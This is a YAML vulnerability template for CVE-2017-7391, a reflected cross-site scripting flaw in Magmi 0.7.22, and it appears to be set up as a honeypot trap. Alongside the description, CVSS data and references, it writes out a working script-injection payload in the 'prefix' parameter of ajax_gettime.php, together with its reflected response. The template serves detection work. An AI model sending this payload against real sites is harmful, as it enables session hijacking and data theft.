id: CVE-2017-7391
info:
  name: Magmi 0.7.22 - Cross-Site Scripting
  author: pikpikcu
  description: Magmi 0.7.22 contains a cross-site scripting vulnerability due to insufficient
    filtration of user-supplied data (prefix) passed to the magmi-git-master/magmi/web/ajax_gettime.php
    URL.
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to session hijacking, defacement, or theft of sensitive information.

    '
  remediation: 'Upgrade to a patched version of Magmi or apply the necessary security
    patches to mitigate the XSS vulnerability.

    '
  reference:
  - https://github.com/dweeves/magmi-git/issues/522
  - https://github.com/dweeves/magmi-git/releases/download/0.7.22/magmi_full_0.7.22.zip
  - https://github.com/dweeves/magmi-git/pull/525
  - https://nvd.nist.gov/vuln/detail/CVE-2017-7391
  - https://github.com/d4n-sec/d4n-sec.github.io
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2017-7391
    cwe-id: CWE-79
    epss-score: 0.00195
    epss-percentile: 0.56428
    cpe: cpe:2.3:a:magmi_project:magmi:0.7.22:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: magmi_project
    product: magmi
  tags: cve2017,cve,magmi,xss,magmi_project
traps:
- request:
    method: GET
    path: /magmi/web/ajax_gettime.php?prefix=%22%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%3C
    headers: null
    body: null
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: '"><script>alert(document.domain);</script><'
